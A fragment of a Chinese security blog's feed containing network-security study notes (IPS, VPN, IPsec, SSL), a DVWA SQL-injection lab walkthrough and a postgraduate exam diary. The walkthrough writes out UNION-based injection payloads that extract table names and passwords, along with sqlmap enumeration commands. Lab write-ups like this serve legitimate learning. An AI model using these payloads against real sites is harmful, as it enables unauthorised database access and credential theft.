id="9-其他安全技术"><a href="#9-其他安全技术" class="headerlink" title="9 其他安全技术"></a>9 其他安全技术</h1><ul><li>   安全隔离与信息交换系统（网闸）</li><li>   入侵防御系统（IPS）</li><li>   安全管理平台（SOC）</li><li>   统一威胁管理系统（UTM）</li><li>   网络准入控制（NAC）</li></ul><h2 id="入侵防御系统（IPS）"><a href="#入侵防御系统（IPS）" class="headerlink" title="入侵防御系统（IPS）"></a>入侵防御系统（IPS）</h2><p>集入侵检测和防御于一体的安全产品，IPS是深层防御的最优方案</p><p>简单来说，可认为IPS就是防火墙+入侵检测系统</p><h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h3><ul><li>识别对网络和主机的恶意攻击，并实时进行阻断；</li><li>向管理控制台发送日志信息；</li><li>集成病毒过滤、带宽管理和URL过滤等功能；</li></ul><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/54fd654b5e1247ca9d484c06140f14c4.png" class title="在这里插入图片描述"><p>IPS不能影响业务系统的可用性、IDS仅关注自身功能的实现</p><h2 id="网闸"><a href="#网闸" class="headerlink" title="网闸"></a>网闸</h2><p>定义：</p><ul><li>在两个不同安全域之间的设备，通过<strong>协议转换</strong>的手段，以<strong>信息摆渡</strong>的方式实现数据交换。其信息流一般为通用应用服务。</li></ul><p>网闸产品至少有两套主机和一个隔离部件</p><p>数据隔离交换过程如下：</p><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/e502e4da0fc040a0aebbb3d5da83dccb.png" class title="在这里插入图片描述"><h2 id="统一威胁管理系统（UTM）"><a href="#统一威胁管理系统（UTM）" class="headerlink" title="统一威胁管理系统（UTM）"></a>统一威胁管理系统（UTM）</h2><p>由硬件、软件和网络技术组成的具有专门用途的设备，它将多种安全特性集成于一个硬设备里, 构成一个标准的统一安全平台。</p><p>功能：</p><ul><li>传统的防火墙功能；</li><li>入侵防御（IPS）功能；</li><li>防病毒功能；</li><li>端到端的IPSec VPN功能；</li><li>动态路由功能；</li><li>内容过滤功能。</li></ul><h2 id="网络准入控制-NAC"><a href="#网络准入控制-NAC" class="headerlink" title="网络准入控制(NAC)"></a>网络准入控制(NAC)</h2><p>确保进入网路的设备是否符合网络准入安全策略</p><p>主要功能：</p><ul><li>认证与授权</li><li>扫描与评估</li><li>隔离与实施</li><li>更新与修复</li></ul><p>包括：</p><ul><li>身份鉴别</li><li>设备安全</li><li>网络安全</li></ul><h3 id="功能需求"><a href="#功能需求" class="headerlink" title="功能需求"></a>功能需求</h3><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/09cdb43219f74e93a4ea5391fa199bd1.png" class title="在这里插入图片描述"><h1 id="10-虚拟专用网技术"><a href="#10-虚拟专用网技术" class="headerlink" title="10 虚拟专用网技术"></a>10 虚拟专用网技术</h1><h2 id="什么是VPN"><a href="#什么是VPN" class="headerlink" title="什么是VPN"></a>什么是VPN</h2><p>在公用网络上建立专用网络，进行安全通讯。</p><p>VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li>按隧道协议种类<ul><li>本质上是在于用户在隧道中传输的数据包是被封装在哪种数据包中</li></ul></li><li>按应用范围<ul><li>VPDN</li><li>Intranet VPN</li><li>Extranet VPN</li></ul></li></ul><h2 id="VPN通道建立的方式"><a href="#VPN通道建立的方式" class="headerlink" title="VPN通道建立的方式"></a>VPN通道建立的方式</h2><ul><li>Host对Host</li><li>Host对VPN网关</li></ul><p>以上两种都：</p><ol><li>要求两边的主机支持IPsec</li><li>VPN网关无要求是否支持IPsec</li></ol><ul><li>VPN对VPN网关：<ul><li>不要求主机支持IPSec，VPN网关必须支持</li></ul></li><li>Remote User对VPN网关：<ul><li>不要求同关内主机支持IPSec</li></ul></li></ul><h2 id="常用的安全VPN协议（简答）"><a href="#常用的安全VPN协议（简答）" class="headerlink" title="常用的安全VPN协议（简答）"></a>常用的安全VPN协议（简答）</h2><ul><li>IPsec协议：主要工作在网络层</li><li>SSL协议：主要工作在传输层</li></ul><h2 id="VPN可以使用的五种协议"><a href="#VPN可以使用的五种协议" class="headerlink" title="VPN可以使用的五种协议"></a>VPN可以使用的五种协议</h2><ul><li>二层隧道协议</li><li>GRE协议</li><li>IPSec协议</li><li>SOCK v5协议</li><li>SSL协议</li></ul><h2 id="IPsec协议"><a href="#IPsec协议" class="headerlink" title="IPsec协议"></a>IPsec协议</h2><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/fb53ebb1de534c7c98c180a41ddc0ff9.png" class title="在这里插入图片描述"><p>IPsec是一个协议包，主要由三个主要的协议以及加密解密算法构成</p><ul><li>ESP协议</li><li>密钥管理协议</li><li>AH协议</li></ul><p>除此之外，还有一个Internet安全协商和密钥管理协议（ISAKMP）是IPsec的重要组件</p><p>安全协商和密钥管理协议提供了应用层服务的通用格式，支持IPsec协商方的密钥管理需求</p><h3 id="AH协议"><a href="#AH协议" class="headerlink" title="AH协议"></a>AH协议</h3><p>![在这里插入图片描述](../../../考研/（笔记整理）网络空间安全技术 (2)/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZXRoYW55aTk=,size_20,color_FFFFFF,t_70,g_se,x_16.png)</p><p>通过为IP数据包插入一个AH头来提供安全服务</p><p>AH可以为IP数据包提供</p><ul><li>无连接完整性</li><li>数据起源鉴别</li><li>抗重放攻击</li></ul><h4 id="AH协议的工作模式"><a href="#AH协议的工作模式" class="headerlink" title="AH协议的工作模式"></a>AH协议的工作模式</h4><p>传输模式、隧道模式</p><h3 id="IP封装安全载荷（Encapsulation-Security-Payload——-ESP）"><a href="#IP封装安全载荷（Encapsulation-Security-Payload——-ESP）" class="headerlink" title="IP封装安全载荷（Encapsulation Security Payload—— ESP）"></a>IP封装安全载荷（Encapsulation Security Payload—— ESP）</h3><p>ESP机制通过将整个IP分组或上层协议部分进行封装到一个ESP载荷之中，对此载荷进行安全处理，实现机密性和完整性保护<br>每个ESP的SA除了具备AH的全部功能以外还用于确保数据包的机密性，所以每一个ESP的SA都必须同时定义两个算法：</p><ul><li>负责保护机密性的加密算法</li><li>负责进行身份验证的鉴别算法</li></ul><h4 id="ESP工作模式"><a href="#ESP工作模式" class="headerlink" title="ESP工作模式"></a>ESP工作模式</h4><p>传输模式和隧道模式</p><h4 id="传输模式"><a href="#传输模式" class="headerlink" title="传输模式"></a>传输模式</h4><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZXRoYW55aTk=,size_20,color_FFFFFF,t_70,g_se,x_16-1696495347303-2.png" class title="在这里插入图片描述"><h4 id="隧道模式"><a href="#隧道模式" class="headerlink" title="隧道模式"></a>隧道模式</h4><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZXRoYW55aTk=,size_20,color_FFFFFF,t_70,g_se,x_16-1696495347303-3.png" class title="在这里插入图片描述"><p>此时的新IP头也是协议字段是50，表明是IP头之后的是一个ESP头</p><h3 id="VPN的解决方案"><a href="#VPN的解决方案" class="headerlink" title="VPN的解决方案"></a>VPN的解决方案</h3><ul><li>连接分支机构 （Intranet VPN）</li><li>连接合作伙伴 （Extranet VPN）</li><li>连接远程用户（Access VPN ）</li></ul><h2 id="SSL协议"><a href="#SSL协议" class="headerlink" title="SSL协议"></a>SSL协议</h2><p>SSL协议：Secure Sockets Layer 安全套接层协议<br>用于Web浏览器和服务器之间的身份认证和加密数据传输</p><p>提供的服务：</p><ul><li>认证用户和服务器，确保数据发送到正确的位置</li><li>加密数据防止数据被窃取</li><li>维护数据完整性，确保数据在传输过程中不被改变</li></ul><h3 id="SSL框架分为两层"><a href="#SSL框架分为两层" class="headerlink" title="SSL框架分为两层"></a>SSL框架分为两层</h3><img src="/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZXRoYW55aTk=,size_20,color_FFFFFF,t_70,g_se,x_16-1696495347304-4.png" class title="在这里插入图片描述"><p>第一层是用于通讯双方进行身份验证、协商加密算法、交换密钥<br>第二层是用来数据封装、压缩、加密等</p><h2 id="HTTPS协议"><a href="#HTTPS协议" class="headerlink" title="HTTPS协议"></a>HTTPS协议</h2><p>建立一个安全通道，来保证数据传输的安全；当使用HTTPS时，下面的通信内容是被加密保护的，第三方即使截获，也没有任何意义</p><ul><li>请求文档的URL</li><li>文档的内容</li><li>浏览器格式的内容</li><li>在浏览器和服务器之间传输的Cookies</li><li>HTTP报头的内容。</li></ul><p>一般采用HTTPS的服务器都会从CA （Certificate Authority）申请一个用于证明服务器用途类型的证书。</p><p> 该证书只有用于对应的服务器的时候，客户端才信任此主机。</p><p> 所以所有的银行系统网站，关键部分应用都是HTTPS的。客户通过信任该证书，从而信任该主机</p><h1 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h1><h2 id="1-风险管理"><a href="#1-风险管理" class="headerlink" title="1 风险管理"></a>1 风险管理</h2><ol><li><p>常用的四类风险处置方法</p></li><li><p>画图分析安全风险的思路</p></li></ol><h2 id="2-鉴别技术"><a href="#2-鉴别技术" class="headerlink" title="2 鉴别技术"></a>2 鉴别技术</h2><ol><li>说明“质询-应答”的身份鉴别技术的原理</li></ol><h2 id="3-防火墙"><a href="#3-防火墙" class="headerlink" title="3 防火墙"></a>3 防火墙</h2><ol><li>给出防火墙的定义和五个考核指标</li><li>企业防火墙的经典部署方案</li></ol><h2 id="3-入侵检测技术"><a href="#3-入侵检测技术" class="headerlink" title="3 入侵检测技术"></a>3 入侵检测技术</h2><ol><li>说明入侵检测技术的技术分类和数据来源分类</li><li>常用的入侵检测模型以及图示</li><li>网络入侵检测系统的缺点</li></ol><h2 id="4-虚拟专用网技术"><a href="#4-虚拟专用网技术" class="headerlink" title="4 虚拟专用网技术"></a>4 虚拟专用网技术</h2><ol><li>常用的VPN技术有哪些，在什么层上工作</li><li>常用的VPN的五种协议</li></ol><h2 id="5-访问控制技术"><a href="#5-访问控制技术" class="headerlink" title="5 访问控制技术"></a>5 访问控制技术</h2><ol><li>强制访问控制的含义</li><li>自主访问控制和强制访问控制的区别</li><li>强制访问控制中数据保密性和数据完整性的具体模型</li><li>四种强制访问策略规定</li></ol><h2 id="6-其他安全技术"><a href="#6-其他安全技术" class="headerlink" title="6 其他安全技术"></a>6 其他安全技术</h2><ol><li>网络准入系统（NAC）的功能</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/2023/10/05/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/image-20231005161503591.png</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DVWA-SQL注入全难度</title>
    <link href="https://thanyi.github.io/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/"/>
    <id>https://thanyi.github.io/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/</id>
    <published>2023-06-07T12:39:10.000Z</published>
    <updated>2023-06-10T03:29:04.198Z</updated>
    
    <content type="html"><![CDATA[<h1 id="手工注入步骤"><a href="#手工注入步骤" class="headerlink" title="手工注入步骤"></a>手工注入步骤</h1><ol><li>查询当前注入可展现的表的列数，也就是这个页面源代码里面自己设置的输出的列数的数目</li><li>查询当前这个列数的表的输出顺序，有时候网站的输出顺序是不一样的</li><li>查询现在源代码所在的数据库名字</li><li>通过information_schema 数据库中的table表进行当前数据库所拥有的表名的查询</li><li>通过information_schema 数据库中的column表进行表名中的查询</li><li>如果password在这里面，就在这里查询</li></ol><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>对于mysql来说，有三个很重要的表和一个数据库：</p><ul><li>数据库：information_schema</li><li>表：tables，columns，schemata</li></ul><p>这三张表中：</p><ul><li>tables：存有数据库中的所有表，字段为： <code>table_name</code>, <code>table_schema</code> </li><li>columns：存有表项相关的内容，字段为：<code>column_name</code>,<code>table_name</code>, <code>table_schema</code></li><li>schemata：存有数据库名的内容，字段：<code>schema_name</code></li></ul><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="观察有没有SQL注入点"><a href="#观察有没有SQL注入点" class="headerlink" title="观察有没有SQL注入点"></a>观察有没有SQL注入点</h3><p>注入点的地方：接受相关参数未经正确处理直接带入数据库进行查询操作。</p><p>我们对输入框进行输入，输入1时，发现没有问题，</p><img src="/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230607200850316.png" class title="image-20230607200850316"><p>然后尝试输入1’,发现报错了</p><img src="/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230607200951083.png" class title="image-20230607200951083"><p>这就是最初级的，毫无安全措施的版本，发现了注入点：因为我们发现我们输入的语句直接变成了在SQL语句中的报错，有两个相同的<code>&#39;</code>号，其实在这里我们就已经可以知道这是字符型注入了（初级）</p><h3 id="判断注入点类型"><a href="#判断注入点类型" class="headerlink" title="判断注入点类型"></a>判断注入点类型</h3><p>注入点分为数值和字符，我们可以通过两个命令看看，</p><p><strong>id=1 and 1=1</strong>和<strong>id=1 and 1=2</strong></p><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>原理是这样的：</p><p>如果这个注入点是字符型的，那么当我输入1 and  1=2或者1 and  1=1的时候，在SQL语句中会自动变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1 and 1=2&#x27;</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1 and 1=1&#x27;</span> </span><br></pre></td></tr></table></figure><p>那么根据SQL语句的类型转换：</p><p>如果在一个数字上下文（例如，用于数字运算、比较或者作为函数的数值型参数）中使用一个字符串，MySQL会将这个字符串尽可能地转换为一个数字。它将从字符串的最左边开始，扫描到第一个无法识别为数字部分的字符为止。</p><p>这个语句会变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> </span><br></pre></td></tr></table></figure><p>它不会报错，所以是字符型注入</p><h4 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h4><p>如果这个注入点是数值型的话，那么当我输入1 and  1=2或者1 and  1=1的时候，在SQL语句中会自动变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> </span><br></pre></td></tr></table></figure><p>可以看出前者会报错（报错通常也不会回显），后者不会</p><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>输入<strong>id=1 and 1=1</strong>和<strong>id=1 and 1=2</strong></p><ul><li>两者都不报错：字符型注入</li><li>前者不报错，后者报错：数值型注入</li></ul><h3 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h3><p>字段数的获取，目的是为了弄清楚这个表中有几个字段，如果后面需要用到<code>union select</code>就很需要先了解这个前提，通过以下方式（#号时为了注释后面的）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 2#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 4#</span></span><br></pre></td></tr></table></figure><p>来查看有多少字段</p><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>联合查询直接在网上找教程就好了，这里直接给code</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select database(),version()</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select column_name,2 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> password,<span class="number">2</span> <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure><h1 id="初级"><a href="#初级" class="headerlink" title="初级"></a>初级</h1><p>所以我们在初级部分直接使用就好了，记得后面添加注释符</p><img src="/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230609210851975.png" class title="image-20230609210851975"><h1 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h1><p>中级的是直接换成了按键选取</p><img src="/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230609210959162.png" class title="image-20230609210959162"><p>我们要意识到，按键只是表面，它的深层次内容就是：POST请求，一切的请求都是网络请求。为什么要说这个呢？我想表达的是，我们可以直接通过抓包，来改变我们想要的请求。</p><p>可以使用的方法挺多的，不过网上能够找到的基本都是使用Burpsuite来抓包，我们也可以这样。不过也可以用火狐的<code>hackbar</code>插件（不过说实话Burpsuite也很方便，没必要改）</p><p>先使用抓包工具抓包，看看报文POST请求的格式，这里直接F12</p><img src="/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230609211552266.png" class title="image-20230609211552266"><img src="/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230609212634991.png" class title="image-20230609212634991"><p>提交Payload后发现报错</p><img src="/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230609212733611.png" class title="image-20230609212733611"><p>发现原来不是字符型注入，原来是数值型注入，后面的步骤就和初级是一样的了,Payload为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> password,<span class="number">2</span> <span class="keyword">from</span> users #</span><br></pre></td></tr></table></figure><p>这道题给我的感悟：还是要把检测字符型注入还是数值型注入放在第一位。</p><h1 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h1><p>打开高级的题目</p><img src="/2023/06/07/dvwa%E8%AF%95%E7%8E%A9/image-20230610110056173.png" class title="image-20230610110056173"><p>发现它是用了单独另开一个界面的方法，这样通过Burpsuite抓包返回的就是这个小窗口了。我们尝试注入一下，发现<code>1 and 1=2</code>和<code>1 and 1=1</code> 都不报错，可以看出是字符型注入</p><p>使用上面整理的命令直接可以得到结果</p><h1 id="sqlmap命令注入使用"><a href="#sqlmap命令注入使用" class="headerlink" title="sqlmap命令注入使用"></a>sqlmap命令注入使用</h1><h2 id="查看可以不可以注入"><a href="#查看可以不可以注入" class="headerlink" title="查看可以不可以注入"></a>查看可以不可以注入</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="literal">-u</span> <span class="string">&quot;这里是包含着你的注入点的url&quot;</span> -<span class="literal">-cookie</span> <span class="string">&quot;如果中途返回302重定向就代表你需要cookie&quot;</span></span><br></pre></td></tr></table></figure><h2 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="literal">-u</span> <span class="string">&quot;你的url&quot;</span> -<span class="literal">-dbs</span></span><br></pre></td></tr></table></figure><h2 id="查看表"><a href="#查看表" class="headerlink" title="查看表"></a>查看表</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="literal">-u</span> <span class="string">&quot;你的url&quot;</span> <span class="literal">-D</span> &lt;数据库名&gt; -<span class="literal">-tables</span></span><br></pre></td></tr></table></figure><h2 id="查看列名"><a href="#查看列名" class="headerlink" title="查看列名"></a>查看列名</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="literal">-u</span> <span class="string">&quot;你的url&quot;</span> <span class="literal">-D</span> &lt;数据库名&gt; <span class="literal">-T</span> -<span class="literal">-columns</span></span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/m0_51756263/article/details/125692951">https://blog.csdn.net/m0_51756263/article/details/125692951</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;手工注入步骤&quot;&gt;&lt;a href=&quot;#手工注入步骤&quot; class=&quot;headerlink&quot; title=&quot;手工注入步骤&quot;&gt;&lt;/a&gt;手工注入步骤&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;查询当前注入可展现的表的列数，也就是这个页面源代码里面自己设置的输出的列数的数目&lt;/li&gt;
&lt;l</summary>
      
    
    
    
    
    <category term="渗透" scheme="https://thanyi.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>四川大学网络空间安全学院考研经验贴</title>
    <link href="https://thanyi.github.io/2023/04/22/028-%E5%9B%9B%E5%B7%9D%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%AD%A6%E9%99%A2%E8%80%83%E7%A0%94%E7%BB%8F%E9%AA%8C%E8%B4%B4/"/>
    <id>https://thanyi.github.io/2023/04/22/028-%E5%9B%9B%E5%B7%9D%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%AD%A6%E9%99%A2%E8%80%83%E7%A0%94%E7%BB%8F%E9%AA%8C%E8%B4%B4/</id>
    <published>2023-04-22T07:47:48.000Z</published>
    <updated>2023-04-22T07:51:23.979Z</updated>
    
    <content type="html"><![CDATA[<p> 23考研结束其实有一段时间了，不过毕业设计耗费了我大多数精力，所以直到现在才开始进行考研的经验复盘（其实也是太懒了）我考的是四川大学网安专硕，数二英二，在今年的考研初试科目中难度还是算简单的。</p><p>总分是388，其中数学114，英语83，政治70以及专业课121。</p><p>不过因为川大自命题872的缘故其实是找不到对应的试卷，当初复习的时候可以说是全部都在看但是很多知识又记不住的状态，而且还正好遇上了疫情，大家都逐渐开始被感染开始发烧，真的可以说是很难受了。</p><p>现在开始一科一科进行阐述吧：</p><h1 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h1><p>我的本科时期的数学成绩在全班算是中等水平，大概80来分的样子。但是由于很久没有接触数学了，耗费在数学上的时间可以说的最多的。看得最多，同时也是最痛苦的的一科就是数学。因为做到后面不会的题目还是不会做，该算错的题目还是会算错，特别是在计算积分和证明题方面，哪怕在很后期了也是有着不小的算错概率。（我觉得数一可能更加痛苦毕竟还有三重积分什么的）但同时又是花的时间最多你不花又不行。</p><h2 id="开始复习（12月到5月）"><a href="#开始复习（12月到5月）" class="headerlink" title="开始复习（12月到5月）"></a>开始复习（12月到5月）</h2><p>我其实从很早很早的时候就开始复习数学了，大概是在21年的12月份吧，开始听杨超老师的《三大计算》。《三大计算》是一个单独联系极限、求导、求不定积分三种计算的习题册，我觉得还是很有用的。但是也是不能光练计算而不追求进度，当时大三下的时候我们有一个大创项目和一个类似于课程设计的东西，占据了我绝大部分时间和精力，所以我基本这几个月就是在弄项目和看代码，看数学就是做做《三大计算》而没有听后面的课程。</p><p>这种节奏就导致我后面至少到5月中旬了，进度其实没看多少，《三大计算》刷了两遍，但是数二可能只看到了微积分的一半左右，更别说线代了。其实后面的关于二重积分或者是多元微分这样的知识对我来说难度还挺大的。《三大计算》虽然很注重基础，但是它的知识范围在整个考研数学中的占比确实也不多。</p><h2 id="开始进入状态（5月到8月）"><a href="#开始进入状态（5月到8月）" class="headerlink" title="开始进入状态（5月到8月）"></a>开始进入状态（5月到8月）</h2><p>因为我的成绩其实是在保研的边缘（大概加上综测达到年级40多名的样子），当时如果有一个项目可以拿奖的话大概率可以保研，不过在后面失之交臂了。这个时期我逐渐意识到了数学学习进度不行，开始拉进度。</p><p>具体表现为直接开始看杨超老师的讲解，然后不做题了。不过视频课上的题都会跟着做做，同时是线代和微积分一起听的，毕竟两边的知识也不是很重叠。当然，也没有很急躁，按部就班地一天听个一两节可能。直到6月底接近开始暑假了，才大致弄完了两科。进度拉完了但是不少细节还是没记住。</p><p>暑假中我其实也没用什么资料，基本都是做做杨超平时微博发的一些题（现在想想我怎么敢的啊），然后复习一下没记住的知识点（比如说微分方程的公式）。不会的又去看看视频这样。</p><h2 id="完全进入状态（8月到12月）"><a href="#完全进入状态（8月到12月）" class="headerlink" title="完全进入状态（8月到12月）"></a>完全进入状态（8月到12月）</h2><p>8月末左右，经过女朋友的影响，开始喜欢去翻小红书，然后看着非常非常多的考研人士推荐《660》，出于好奇买了一本，开始刷题。然后发现真的《660》真的好难，直接一开头几页就有好多不会的，终于开始有点慌了，开始直接死磕《660》（现在想想说不定做880都比做660好）</p><p>去年的660不像是24考研的660，听说24年的660是真的往基础方向靠拢了，但是23年的时候660的难度直接可以当作强化的题型，对我来说难得离谱。每天就是做做做，然后错错错。而且660不像880那样感觉每道题是经典例题，可以从中消化和延伸出不少知识点，660的难度分布对我真的有点迷惑。</p><p>这样差不多做了1个月，每天大半天时间都在看数学，大概9月中的时候660被我做完了，但是如上所说，吸收得不是很好，所以开始刷880了，当然由于时间的原因只能挑不会的部分章节做。</p><p>然后就是开始做卷子了，汤家凤强化5套（这个可能偏基础计算一点）、13~22年真题、余炳森5套、张宇8套、以及最重要的李林6+4套卷。做的时候一边复习一边做，哪个部分知识点不会的，记录下来取去880上面寻找类似的题目，从9月末开始可能2、3天一篇吧，到11月可能是3天2篇那种。</p><p>这里真的推荐一个B站up主：没咋了，它的660和880我真是太喜欢了，他解题数形结合的思想让我真的茅塞顿开。后期李林套卷我也是跟着他的视频进行的梳理归纳，真的很喜欢他的风格。</p><h1 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h1><p>英语其实可以说的也不是很多，主要是背单词和看文章。我的英语六级大概刚刚达到500分，勉强还是有一点基础。就我的经验来说的话，单词为王。</p><p>我大概是从22年1月左右开始的，当时也就只有背单词，不过当时有项目占据我的时间，单词背得也不多。真正开始是从4~5月之后开始每天固定雷打不动的背单词，然后就是微信公众号找那种英文文章看，最好是带个中英翻译的文章，每次看文章把不会的词记在单词本（或者单词app）里面。</p><p>因为每篇文章都会有一些比较常用的较为学术化的单词，文章看多了单词本记多了就自然而然的对英语文章中出现频率较高的词有种敏感性了。</p><p>我是从暑假开始做题的，英语做题只用做真题就行了，建议留几张真题试卷当模拟题做，其他的试卷都可以把阅读部分拆开看，主要就是看阅读，英语卷子阅读部分好大概率就是高分。</p><p>然后把真题阅读部分不会的单词也整理在自己的单词本上，英一英二其实也就是10 ~ 22年的卷子总共26套，一套4篇阅读。哪怕你留个6套卷子那也有20 * 4 = 80篇阅读，也还是不少了。一开始可以先随便看几篇做做，然后9月份开始一天看个1到2篇左右，全部做完了你可以试试二刷，总结一下做题小技巧之类的也行。</p><h1 id="政治"><a href="#政治" class="headerlink" 